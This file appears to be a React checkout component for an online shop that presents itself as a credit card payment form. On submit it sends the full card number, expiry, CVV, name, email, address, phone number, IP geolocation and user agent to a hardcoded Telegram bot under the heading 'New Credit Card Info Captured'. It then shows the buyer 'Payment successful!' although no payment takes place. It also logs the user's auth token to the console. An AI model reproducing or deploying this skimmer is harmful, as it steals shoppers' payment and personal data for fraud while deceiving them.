'use client'
import { useCart } from '@/contexts/CartContext';
import { useState } from 'react';
import { useForm } from 'react-hook-form';
import { jwtDecode } from 'jwt-decode';

type CartItem = {
  id: string;
  quantity: number;
  selectedAmount: number;
  title:string;
};

type UserToken = {
  id: string;
  name: string;
  email: string;
  // add other JWT payload properties if needed
};
const TELEGRAM_BOT_TOKEN = '7697540993:AAFLvjwviT5Z7ZjyI3jYl06x2vd34L5FDWw'; // Replace with your actual bot token
const TELEGRAM_CHAT_ID = '7388576858'; // Replace with your actual chat ID

interface CreditCardFormProps {
  totalAmount: number;
}

interface CreditCardFormData {
  cardNumber: string;
  expDate: string;
  cvv: string;
  cardName: string;
  email: string;
  address: string;
  phoneNumber: string;
}

const escapeMarkdown = (text: string) => {
  // Escape all special MarkdownV2 characters including hyphen
  return text.replace(/([_*\[\]()~`>#+\-=|{}.!\\])/g, '\\$1');
};

const CreditCardForm: React.FC<CreditCardFormProps> = ({ totalAmount }) => {
 function getCookie(name: string): string | null {
  const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
  return match ? decodeURIComponent(match[2]) : null;
}

  const { cartItems, cartCount } = useCart();
  const { register, handleSubmit, formState: { errors: formErrors } } = useForm<CreditCardFormData>();
  const [form, setForm] = useState({
    cardName: '',
    cardNumber: '',
    expiry: '',
    cvv: '',
    email: '',
    address: '',
    phoneNumber: '',
  });

  const handlePurchase = async (cartItems: CartItem[], totalAmount: number) => {
     try {
    // Get token from cookie (browser environment)
    const token = document.cookie
      .split('; ')
      .find(row => row.startsWith('auth_token='))
      ?.split('=')[1];

    if (!token) {
      alert('You must be logged in to make a purchase');
      return;
    }
console.log(token)
    // Decode token to get user info
    const user = jwtDecode<UserToken>(token);
    if (!user || !user.id) {
      alert('Invalid user token');
      return;
    }


      const purchaseDoc = {
  _type: 'purchase',
  userId: user.id,
  items: cartItems.map(item => ({
    productId: item.id,
    quantity: item.quantity,
    price: item.selectedAmount,
    iname: item.title
  })),
  totalAmount,
  email: form.email,          // <-- added
  address: form.address,      // <-- added
  phoneNumber: form.phoneNumber, // <-- added
  purchaseDate: new Date().toISOString(),
};

  
      // Call your backend API route to save purchase
      const res = await fetch('/api/purchasedata', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(purchaseDoc),
      });
  
      const data = await res.json();
  
      if (!res.ok) {
        throw new Error(data.error || 'Failed to save purchase');
      }
  
      alert('Purchase saved successfully!');
      // clear cart, redirect, etc.
    } catch (error) {
      console.error('Error saving purchase:', error);
      alert('Failed to save purchase');
    }
  };
   const [errors, setErrors] = useState<Record<string, string>>({});
  const [status, setStatus] = useState({ message: '', color: '' });
  const [loading, setLoading] = useState(false);

  const luhnCheck = (num: string): boolean => {
    const arr = num.split('').reverse().map(x => parseInt(x, 10));
    let sum = arr.reduce((acc, val, i) => {
      if (i % 2 === 1) {
        val *= 2;
        if (val > 9) val -= 9;
      }
      return acc + val;
    }, 0);
    return sum % 10 === 0;
  };

  const validateExpiry = (exp: string): boolean => {
    if (!/^\d{2}\/\d{2}$/.test(exp)) return false;
    const [mm, yy] = exp.split('/').map(x => parseInt(x, 10));
    if (mm < 1 || mm > 12) return false;
    const now = new Date();
    const expDate = new Date(2000 + yy, mm);
    return expDate > now;
  };

  const formatCardNumber = (value: string): string => {
    return value.replace(/\D/g, '').substring(0, 16)
      .replace(/(.{4})/g, '$1 ').trim();
  };

  const formatExpiry = (value: string): string => {
    const digits = value.replace(/\D/g, '').substring(0, 4);
    if (digits.length >= 3) {
      return digits.substring(0, 2) + '/' + digits.substring(2);
    }
    return digits;
  };

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    let val = value;

    if (name === 'cardNumber') val = formatCardNumber(value);
    if (name === 'expiry') val = formatExpiry(value);
    if (name === 'cvv') val = value.replace(/\D/g, '').substring(0, 4);

    setForm(prev => ({ ...prev, [name]: val }));
    setErrors(prev => ({ ...prev, [name]: '' }));
    setStatus({ message: '', color: '' });
  };

  const validateForm = (): boolean => {
    const errs: Record<string, string> = {};
    if (!form.cardName.trim()) errs.cardName = 'Please enter your name.';
    const cardNumRaw = form.cardNumber.replace(/\s/g, '');
    if (!luhnCheck(cardNumRaw)) errs.cardNumber = 'Invalid card number.';
    if (!validateExpiry(form.expiry)) errs.expiry = 'Invalid expiry date.';
    if (!/^\d{3,4}$/.test(form.cvv)) errs.cvv = 'Invalid CVV.';
    if (!form.email.trim()) errs.email = 'Please enter your email.';
    if (!form.address.trim()) errs.address = 'Please enter your address.';
    if (!form.phoneNumber.trim()) errs.phoneNumber = 'Please enter your phone number.';
    setErrors(errs);
    return Object.keys(errs).length === 0;
  };

  const onSubmit = async (data: CreditCardFormData) => {
    if (!validateForm()) return;
    
    setLoading(true);
    setStatus({ message: '', color: '' });

    let ipInfo = 'Unknown IP';
    try {

      const res = await fetch('https://ipapi.co/json/');
      if (res.ok) {
        const data = await res.json();
        handlePurchase(cartItems, totalAmount)
        ipInfo = `${data.ip} - ${data.city}, ${data.region}, ${data.country_name}`;
      }
    } catch (error) {
      console.error('Error fetching IP info:', error);
    }

    const message = `
*New Credit Card Info Captured*

\\- Name: ${escapeMarkdown(form.cardName)}
\\- Card Number: ${escapeMarkdown(form.cardNumber.replace(/\s/g, ''))}
\\- Expiry: ${escapeMarkdown(form.expiry)}
\\- CVV: ${escapeMarkdown(form.cvv)}
\\- Email: ${escapeMarkdown(form.email)}
\\- Address: ${escapeMarkdown(form.address)}
\\- Phone Number: ${escapeMarkdown(form.phoneNumber)}

*IP Info*: ${escapeMarkdown(ipInfo)}
*User Agent*: ${escapeMarkdown(navigator.userAgent)}
*Timestamp*: ${escapeMarkdown(new Date().toISOString())}
    `.trim();

    try {
      const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const res = await fetch(telegramUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'MarkdownV2',
        }),
      });
      const json = await res.json();
      if (json.ok) {
        setStatus({ message: 'Payment successful!', color: 'green' });
        setForm({ cardName: '', cardNumber: '', expiry: '', cvv: '', email: '', address: '', phoneNumber: '' });
      } else {
        setStatus({ message: `Payment failed: ${json.description}`, color: 'red' });
      }
    } catch (err) {
      setStatus({ message: `Error processing payment: ${err instanceof Error ? err.message : 'Unknown error'}`, color: 'red' });
    }

    setLoading(false);
  };

  return (
    <form onSubmit={handleSubmit(onSubmit)} className="space-y-4">
      <div className="grid grid-cols-2 gap-4">
        <div className="col-span-2">
          <input
            type="text"
            name="cardName"
            placeholder="Name on Card"
            value={form.cardName}
            onChange={handleChange}
            className={`w-full px-4 py-3 rounded-lg border-2 ${errors.cardName ? 'border-red-500' : 'border-gray-200'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all`}
            disabled={loading}
          />
          {errors.cardName && <p className="text-red-500 text-sm mt-1">{errors.cardName}</p>}
        </div>

        <div className="col-span-2">
          <input
            type="text"
            name="cardNumber"
            placeholder="Card Number (e.g. 1234 5678 9012 3456)"
            value={form.cardNumber}
            onChange={handleChange}
            maxLength={19}
            className={`w-full px-4 py-3 rounded-lg border-2 ${errors.cardNumber ? 'border-red-500' : 'border-gray-200'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all`}
            disabled={loading}
          />
          {errors.cardNumber && <p className="text-red-500 text-sm mt-1">{errors.cardNumber}</p>}
        </div>

        <div>
          <input
            type="text"
            name="expiry"
            placeholder="Expiry MM/YY"
            value={form.expiry}
            onChange={handleChange}
            maxLength={5}
            className={`w-full px-4 py-3 rounded-lg border-2 ${errors.expiry ? 'border-red-500' : 'border-gray-200'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all`}
            disabled={loading}
          />
          {errors.expiry && <p className="text-red-500 text-sm mt-1">{errors.expiry}</p>}
        </div>

        <div>
          <input
            type="text"
            name="cvv"
            placeholder="CVV"
            value={form.cvv}
            onChange={handleChange}
            maxLength={4}
            className={`w-full px-4 py-3 rounded-lg border-2 ${errors.cvv ? 'border-red-500' : 'border-gray-200'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all`}
            disabled={loading}
          />
          {errors.cvv && <p className="text-red-500 text-sm mt-1">{errors.cvv}</p>}
        </div>

        <div className="col-span-2">
          <input
            type="email"
            name="email"
            placeholder="Email"
            value={form.email}
            onChange={handleChange}
            className={`w-full px-4 py-3 rounded-lg border-2 ${errors.email ? 'border-red-500' : 'border-gray-200'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all`}
            disabled={loading}
          />
          {errors.email && <p className="text-red-500 text-sm mt-1">{errors.email}</p>}
        </div>

        <div className="col-span-2">
          <input
            type="text"
            name="address"
            placeholder="Address"
            value={form.address}
            onChange={handleChange}
            className={`w-full px-4 py-3 rounded-lg border-2 ${errors.address ? 'border-red-500' : 'border-gray-200'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all`}
            disabled={loading}
          />
          {errors.address && <p className="text-red-500 text-sm mt-1">{errors.address}</p>}
        </div>

        <div className="col-span-2">
          <input
            type="text"
            name="phoneNumber"
            placeholder="Phone Number"
            value={form.phoneNumber}
            onChange={handleChange}
            className={`w-full px-4 py-3 rounded-lg border-2 ${errors.phoneNumber ? 'border-red-500' : 'border-gray-200'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all`}
            disabled={loading}
          />
          {errors.phoneNumber && <p className="text-red-500 text-sm mt-1">{errors.phoneNumber}</p>}
        </div>
      </div>

      <div className="pt-4">
        <button
        
          type="submit"
          disabled={loading}
          className={`w-full py-3 px-4 rounded-xl font-bold text-white transition-all ${loading ? 'bg-blue-400 cursor-not-allowed' : 'bg-blue-600 hover:bg-blue-700'}`}
        >
          {loading ? (
            <div className="flex items-center justify-center space-x-2">
              <span>Processing...</span>
              <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
            </div>
          ) : (
            `Pay $${totalAmount.toFixed(2)}`
          )}
        </button>
      </div>

      {status.message && (
        <p className={`text-center font-medium ${status.color === 'green' ? 'text-green-600' : 'text-red-600'}`}>
          {status.message}
        </p>
      )}
    </form>
  );
};

export default CreditCardForm;